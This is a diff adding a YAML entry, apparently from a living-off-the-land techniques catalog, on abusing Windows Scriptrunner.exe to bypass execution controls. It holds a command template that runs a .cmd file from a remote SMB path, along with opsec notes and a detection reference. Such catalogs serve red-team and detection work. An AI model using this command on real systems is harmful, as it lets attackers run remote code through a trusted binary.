@@ -1,0 +1,30 @@
+id: lolbas/scriptrunner/execute/1
+type: binary
+platform: windows
+name: Scriptrunner.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1218
+opsec:
+  noise: high
+  triggers: Scriptrunner.exe should not be in use unless App-v is deployed
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml
+commands:
+- template: ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
+  comment: Executes cmd file from remote server
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/
+tags:
+- windows
+- lolbas
